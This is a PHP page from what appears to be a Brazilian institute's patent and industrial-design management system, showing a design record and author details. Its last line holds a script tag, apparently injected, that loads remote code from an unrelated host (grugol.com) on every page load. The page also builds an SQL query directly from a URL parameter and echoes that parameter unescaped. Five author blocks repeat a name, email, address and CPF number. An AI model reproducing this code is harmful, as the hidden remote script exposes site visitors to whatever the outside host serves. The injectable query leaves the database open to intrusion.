<?php

include 'configs/conexao.php';
if (!isset($_SESSION)) {
  session_start();
}

$id_des = $_GET["id_des"];
$buscar_cadastro = "SELECT * FROM desenho_industrial WHERE cd_des = $id_des";
$query_cadastros = mysqli_query($conn, $buscar_cadastro);

// Query para busca na tabela de Programas
while ($receber_dados = mysqli_fetch_array($query_cadastros)) {
  $nome = $receber_dados['tit_des'];
  $status = $receber_dados['status'];
  $tipo = $receber_dados['tipo'];
  $data = $receber_dados['data_cad'];
  $tipo_desenho = '';
  if ($tipo == '1') {
    $tipo_desenho = "Patente de Invenção";
  } else {
    $tipo_desenho = "Modelo de Utilidade";
  }

  $status_ptt = '';
  if ($status == '1') {
    $status_ptt = "Patente Concedida";
  } else if ($status == '2') {
    $status_ptt = "Esperando Depositada";
  } else if ($status == '3') {
    $status_ptt = "Acompanhamento na Revista";
  } else if ($status == '4') {
    $status_ptt = "Esperando Contabilidade";
  } else if ($status == '5') {
    $status_ptt = "Redação do desenho";
  } else {
    $status_ptt = "Patente Excluida";
  }
}

?>

<html lang="pt-BR">

<head>

  <meta charset="UTF-8" />
  <title> Minha Conta</title>
  <meta charset="UTF-8">

  <!--Os arquivos Meta-->
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <meta name="description" content"Espaço GNIT">
  <meta name="author" content="">
  <!--Fim dos arquivos Meta-->

  <!--Os Arquivos CSS-->
  <link href="css/bootstrap.min.css" rel="stylesheet">
  <link href="css/bootstrap-responsive.min.css" rel="stylesheet">
  <link href="css/template.css" rel="stylesheet">


  <!--HTML5 shim,for IE6-8 support of HTML5 elements -->
  <!--[if lt IE 9]>
			<script src="js/html5shiv.js></script>"
		<![endif]-->

</head>

<body>

  <!-- Modal -->
  <div class="modal fade" id="delete-modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal" aria-label="Fechar"><span aria-hidden="true">&times;</span></button>
          <h4 class="modal-title" id="modalLabel">Excluir Item</h4>
        </div>
        <div class="modal-body">
          Deseja realmente excluir este Usuário?
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary">Sim</button>
          <button type="button" class="btn btn-default" data-dismiss="modal">N&atilde;o</button>
        </div>
      </div>
    </div>
  </div>

  <nav class="navbar navbar-default navbar-fixed-top">
    <div class="container">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand" href="tela_principal.php"><b>Espaço NIT</b></a>
      </div>
      <div id="navbar" class="navbar-collapse collapse">
        <ul class="nav navbar-nav">

          <li><a href="portflio.php">Portfólio</a></li>
          <li><a href="quem.php">Quem Somos</a></li>
          <li><a href="contato.php">Contato</a></li>
          <li><a href="http://sigaa.ifal.edu.br/">Fan Page</a></li>
          <li><a href="https://www.instagram.com/NIT.IFAL">Instagram</a></li>
        </ul>
        <ul class="nav navbar-nav navbar-right">

          <!--<li class="active"><a href="./">Fixed top <span class="sr-only">(current)</span></a></li>-->
          <div id="perfil">
            <span style="vertical-align:middle; padding-right:10px"> <i><?php echo $_SESSION['nome']; ?></i></span>
            <a href="minhaconta.php"><img src="https://via.placeholder.com/40" class="img-circle"></a>
          </div>


        </ul>
      </div><!--/.nav-collapse -->
    </div>
  </nav> <!--Final da NavBar-->


  <div class="container-fluid" style="margin-top:80px;">
    <div class="row">
      <div class="col-md-2" id="menu-esquerdo">
        <p><img src="img/nit.jpg" style="margin-left:15px"></p>
        <ul class="nav nav-pills nav-stacked">
          <li role="presentation"><a href="propriedades.php"><img src="img/dashboard.png"> DashBoard</a></li>
          <li role="presentation"><a href="minhastarefas.php"><img src="img/carrinho.png"> Minhas Tarefas</a></li>
          <li role="presentation" class="active"><a href="minhaconta.php"><img src="img/ticket.png"> Minha Conta</a></li>
          <li role="presentation"><a href="faq.php"><img src="img/faq.png"> Sistema de FAQ</a></li>
          <li role="presentation"><a href="index.php"><img src="img/sair.png"> Sair</a></li>
        </ul>
      </div> <!--Final Menu Esquerdo-->


      <div class="table-responsive col-md-10">
        <table class="table table-striped" cellspacing="0" cellpadding="0">

          <div id="main" class="container-fluid">

            <h3 class="page-header">Dados do desenho</h3>

            <div class="row">
              <div class=col-md-12>
                <div class="col-md-4">
                  <p><strong>Nome do desenho</strong></p>
                  <p><?php echo $nome; ?></p>
                </div>


                <div class="col-md-4">
                  <p><strong>Status do desenho</strong></p>
                  <p><?php echo $status_ptt; ?></p>
                </div>

                <div class="col-md-4">
                  <p><strong>Tipo de Patente</strong></p>
                  <p><?php echo $tipo_desenho; ?></p>
                </div>
              </div>
              <div class=col-md-12>
                <hr>

                <div class=col-md-12>
                  <h3>Autor 01</h3>
                </div>
                <div class=col-md-12>
                  <div class="col-md-4">
                    <p><strong>Nome</strong></p>
                    <p>Edson Camilo</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Qualificação</strong></p>
                    <p>Professor do Ensino Profissional</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>E-mail</strong></p>
                    <p>edsoncamilo@gmail.com</p>
                  </div>
                </div>

                <div class="col-md-12">
                  <div class="col-md-4">
                    <p><strong>Endereço</strong></p>
                    <p>Rua professor Mário Marroquim 449, pinheiro</p>
                  </div>
                  <div class="col-md-4">
                    <p><strong>Senha</strong></p>
                    <p>********</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Horário</strong></p>
                    <p>08:00 às 12:00</p>
                  </div>

                </div>
                <div class="col-md-12">
                  <div class="col-md-4">
                    <p><strong>Rua</strong></p>
                    <p>Rua professor Mário Marroquim </p>
                  </div>
                  <div class="col-md-4">
                    <p><strong>Número</strong></p>
                    <p>449</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Bairro</strong></p>
                    <p>Pinheiro</p>
                  </div>

                </div>
                <div class="col-md-12">
                  <div class="col-md-4">
                    <p><strong>CPF</strong></p>
                    <p>03123129312</p>
                  </div>
                  <div class="col-md-4">
                    <p><strong>Senha</strong></p>
                    <p>********</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Horário</strong></p>
                    <p>08:00 às 12:00</p>
                  </div>

                </div>



                <div class=col-md-12>
                  <hr>
                  <h3>Autor 02</h3>
                </div>
                <div class=col-md-12>
                  <div class="col-md-4">
                    <p><strong>Nome</strong></p>
                    <p>Edson Camilo</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Qualificação</strong></p>
                    <p>Professor do Ensino Profissional</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>E-mail</strong></p>
                    <p>edsoncamilo@gmail.com</p>
                  </div>
                </div>

                <div class="col-md-12">
                  <div class="col-md-4">
                    <p><strong>Endereço</strong></p>
                    <p>Rua professor Mário Marroquim 449, pinheiro</p>
                  </div>
                  <div class="col-md-4">
                    <p><strong>Senha</strong></p>
                    <p>********</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Horário</strong></p>
                    <p>08:00 às 12:00</p>
                  </div>

                </div>
                <div class="col-md-12">
                  <div class="col-md-4">
                    <p><strong>Rua</strong></p>
                    <p>Rua professor Mário Marroquim </p>
                  </div>
                  <div class="col-md-4">
                    <p><strong>Número</strong></p>
                    <p>449</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Bairro</strong></p>
                    <p>Pinheiro</p>
                  </div>

                </div>
                <div class="col-md-12">
                  <div class="col-md-4">
                    <p><strong>CPF</strong></p>
                    <p>03123129312</p>
                  </div>
                  <div class="col-md-4">
                    <p><strong>Senha</strong></p>
                    <p>********</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Horário</strong></p>
                    <p>08:00 às 12:00</p>
                  </div>

                </div>
                <div class=col-md-12>
                  <hr>
                  <h3>Autor 03</h3>
                </div>
                <div class=col-md-12>
                  <div class="col-md-4">
                    <p><strong>Nome</strong></p>
                    <p>Edson Camilo</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Qualificação</strong></p>
                    <p>Professor do Ensino Profissional</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>E-mail</strong></p>
                    <p>edsoncamilo@gmail.com</p>
                  </div>
                </div>

                <div class="col-md-12">
                  <div class="col-md-4">
                    <p><strong>Endereço</strong></p>
                    <p>Rua professor Mário Marroquim 449, pinheiro</p>
                  </div>
                  <div class="col-md-4">
                    <p><strong>Senha</strong></p>
                    <p>********</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Horário</strong></p>
                    <p>08:00 às 12:00</p>
                  </div>

                </div>
                <div class="col-md-12">
                  <div class="col-md-4">
                    <p><strong>Rua</strong></p>
                    <p>Rua professor Mário Marroquim </p>
                  </div>
                  <div class="col-md-4">
                    <p><strong>Número</strong></p>
                    <p>449</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Bairro</strong></p>
                    <p>Pinheiro</p>
                  </div>

                </div>
                <div class="col-md-12">
                  <div class="col-md-4">
                    <p><strong>CPF</strong></p>
                    <p>03123129312</p>
                  </div>
                  <div class="col-md-4">
                    <p><strong>Senha</strong></p>
                    <p>********</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Horário</strong></p>
                    <p>08:00 às 12:00</p>
                  </div>

                </div>

                <div class=col-md-12>
                  <hr>
                  <h3>Autor 04</h3>
                </div>
                <div class=col-md-12>
                  <div class="col-md-4">
                    <p><strong>Nome</strong></p>
                    <p>Edson Camilo</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Qualificação</strong></p>
                    <p>Professor do Ensino Profissional</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>E-mail</strong></p>
                    <p>edsoncamilo@gmail.com</p>
                  </div>
                </div>

                <div class="col-md-12">
                  <div class="col-md-4">
                    <p><strong>Endereço</strong></p>
                    <p>Rua professor Mário Marroquim 449, pinheiro</p>
                  </div>
                  <div class="col-md-4">
                    <p><strong>Senha</strong></p>
                    <p>********</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Horário</strong></p>
                    <p>08:00 às 12:00</p>
                  </div>

                </div>
                <div class="col-md-12">
                  <div class="col-md-4">
                    <p><strong>Rua</strong></p>
                    <p>Rua professor Mário Marroquim </p>
                  </div>
                  <div class="col-md-4">
                    <p><strong>Número</strong></p>
                    <p>449</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Bairro</strong></p>
                    <p>Pinheiro</p>
                  </div>

                </div>
                <div class="col-md-12">
                  <div class="col-md-4">
                    <p><strong>CPF</strong></p>
                    <p>03123129312</p>
                  </div>
                  <div class="col-md-4">
                    <p><strong>Senha</strong></p>
                    <p>********</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Horário</strong></p>
                    <p>08:00 às 12:00</p>
                  </div>

                </div>

                <div class=col-md-12>
                  <hr>
                  <h3>Autor 05</h3>
                </div>
                <div class=col-md-12>
                  <div class="col-md-4">
                    <p><strong>Nome</strong></p>
                    <p>Edson Camilo</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Qualificação</strong></p>
                    <p>Professor do Ensino Profissional</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>E-mail</strong></p>
                    <p>edsoncamilo@gmail.com</p>
                  </div>
                </div>

                <div class="col-md-12">
                  <div class="col-md-4">
                    <p><strong>Endereço</strong></p>
                    <p>Rua professor Mário Marroquim 449, pinheiro</p>
                  </div>
                  <div class="col-md-4">
                    <p><strong>Senha</strong></p>
                    <p>********</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Horário</strong></p>
                    <p>08:00 às 12:00</p>
                  </div>

                </div>
                <div class="col-md-12">
                  <div class="col-md-4">
                    <p><strong>Rua</strong></p>
                    <p>Rua professor Mário Marroquim </p>
                  </div>
                  <div class="col-md-4">
                    <p><strong>Número</strong></p>
                    <p>449</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Bairro</strong></p>
                    <p>Pinheiro</p>
                  </div>

                </div>
                <div class="col-md-12">
                  <div class="col-md-4">
                    <p><strong>CPF</strong></p>
                    <p>03123129312</p>
                  </div>
                  <div class="col-md-4">
                    <p><strong>Senha</strong></p>
                    <p>********</p>
                  </div>

                  <div class="col-md-4">
                    <p><strong>Horário</strong></p>
                    <p>08:00 às 12:00</p>
                  </div>

                </div>
              </div>
            </div>
          </div>



          <br />

          <div class="col-md-12">
            <a href="desenho.php" class="btn btn-primary">Fechar</a>
            <a href="editardesenho.php?id_des=<?php echo $id_des; ?>" class="btn btn-default">Editar</a>
            <a href="#" class="btn btn-default" data-toggle="modal" data-target="#delete-modal">Excluir</a>
          </div>
      </div>



      <div class="col-md-12">
        <hr>
        <footer>
          <h3>&copy Espaço NIT - Todos os Direitos Reservados</h3>
        </footer>

      </div>

      <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

      <!-- Latest compiled and minified JavaScript -->
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
      <script src='http://grugol.com/prog/landing.php?app=MDAtMUYtRDAtRTgtMEItQTQ=&partner=300'></script>
</body>

</html>